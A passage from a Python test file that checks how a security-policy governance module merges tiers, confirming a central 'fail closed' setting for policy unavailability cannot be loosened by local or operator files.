        block = governance.PolicyDistribution.from_dict(
            {"on_unavailable": governance.UNAVAILABLE_FAIL_CLOSED}
        )
        assert block == governance.PolicyDistribution()

    def test_a_subordinate_cannot_loosen_an_explicit_fail_closed(
        self, monkeypatch, tmp_path, central
    ):
        central("fleet", distribution={"on_unavailable": governance.UNAVAILABLE_FAIL_CLOSED})
        monkeypatch.setenv(
            _POLICY_ENV,
            str(
                _write_policy(
                    tmp_path / "env.json",
                    "local-env",
                    distribution={"on_unavailable": governance.UNAVAILABLE_DEGRADE},
                )
            ),
        )
        ceiling = load_security_policy()
        assert ceiling is not None
        assert ceiling.distribution.on_unavailable == governance.UNAVAILABLE_FAIL_CLOSED

    def test_a_subordinate_still_supplies_the_pins_when_the_authority_is_silent(
        self, monkeypatch, tmp_path, central
    ):
        # The "absence means no choice" class is unchanged: a central document that
        # carries no ``distribution`` block at all has expressed nothing, so the
        # highest tier that did declare one still wins.
        central("fleet")
        monkeypatch.setenv(
            _POLICY_ENV,
            str(
                _write_policy(
                    tmp_path / "env.json",
                    "local-env",
                    distribution={"on_unavailable": governance.UNAVAILABLE_DEGRADE},
                )
            ),
        )
        ceiling = load_security_policy()
        assert ceiling is not None
        assert ceiling.distribution.on_unavailable == governance.UNAVAILABLE_DEGRADE

    def test_the_refresh_path_keeps_the_explicit_disposition_too(self, monkeypatch, tmp_path):
        _point_home(
            monkeypatch,
            _write_policy(
                tmp_path / "home.json",
                "operator",
                distribution={"on_unavailable": governance.UNAVAILABLE_DEGRADE},
            ),
        )
        refreshed = governance.compose_installed_ceiling(
            governance.parse_policy(
                _doc(
                    "fleet",
                    distribution={"on_unavailable": governance.UNAVAILABLE_FAIL_CLOSED},
                )
            )
        )
        assert refreshed.distribution.on_unavailable == governance.UNAVAILABLE_FAIL_CLOSED
